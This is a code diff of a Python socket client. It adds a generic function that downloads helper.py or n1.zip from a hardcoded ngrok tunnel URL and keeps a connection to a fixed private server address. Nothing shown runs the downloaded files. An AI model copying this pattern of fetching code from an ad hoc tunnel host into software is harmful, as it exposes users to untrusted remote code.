@@ -1,27 +1,35 @@
 import sys
 import requests
-def download_helper_py(ngrok_url):
-    # Ensure the URL is in the correct format
-    if not ngrok_url.startswith("http"):
-        ngrok_url = "https://" + ngrok_url
-    if ngrok_url.endswith("/"):
-        ngrok_url = ngrok_url[:-1]
-    file_url = ngrok_url + "/helper.py"
-    print(f"[DOWNLOAD] Fetching {file_url}")
-    try:
-        resp = requests.get(file_url)
-        resp.raise_for_status()
-        with open("helper.py", "wb") as f:
-            f.write(resp.content)
-        print("[SUCCESS] helper.py downloaded and saved.")
-    except Exception as e:
-        print(f"[ERROR] Could not download helper.py: {e}")
 import socket
 import threading
 import time
 import os
 
 BUFFER_SIZE = 1024
+
+
+def download_file(ngrok_url, filename):
+    """Generic function to download a file (like helper.py or n1.zip)"""
+    if not ngrok_url.startswith("http"):
+        ngrok_url = "https://" + ngrok_url
+    if ngrok_url.endswith("/"):
+        ngrok_url = ngrok_url[:-1]
+
+    file_url = ngrok_url + "/" + filename
+    print(f"[DOWNLOAD] Fetching {file_url}")
+    try:
+        resp = requests.get(file_url, stream=True)
+        resp.raise_for_status()
+
+        with open(filename, "wb") as f:
+            for chunk in resp.iter_content(chunk_size=BUFFER_SIZE):
+                if chunk:
+                    f.write(chunk)
+
+        print(f"[SUCCESS] {filename} downloaded and saved.")
+    except Exception as e:
+        print(f"[ERROR] Could not download {filename}: {e}")
+
 
 def receive_messages(sock):
     """Thread to constantly receive messages or files from server"""
@@ -100,13 +108,19 @@ def run_client(server_ip, port=5002):
 
 
 if __name__ == "__main__":
-    # Default ngrok link for helper.py download
-    DEFAULT_NGROK_LINK = "https://8aa52be9c197.ngrok-free.app"
-    if len(sys.argv) >= 2 and sys.argv[1] == "--download-helper":
-        if len(sys.argv) == 3:
-            ngrok_link = sys.argv[2]
+    DEFAULT_NGROK_LINK = "https://4cc4a89bea34.ngrok-free.app"
+
+    if len(sys.argv) >= 2:
+        if sys.argv[1] == "--download-helper":
+            ngrok_link = sys.argv[2] if len(sys.argv) == 3 else DEFAULT_NGROK_LINK
+            download_file(ngrok_link, "helper.py")
+
+        elif sys.argv[1] == "--download-zip":
+            ngrok_link = sys.argv[2] if len(sys.argv) == 3 else DEFAULT_NGROK_LINK
+            download_file(ngrok_link, "n1.zip")
+
         else:
-            ngrok_link = DEFAULT_NGROK_LINK
-        download_helper_py(ngrok_link)
+            run_client("172.18.237.8")
+
     else:
         run_client("172.18.237.8")
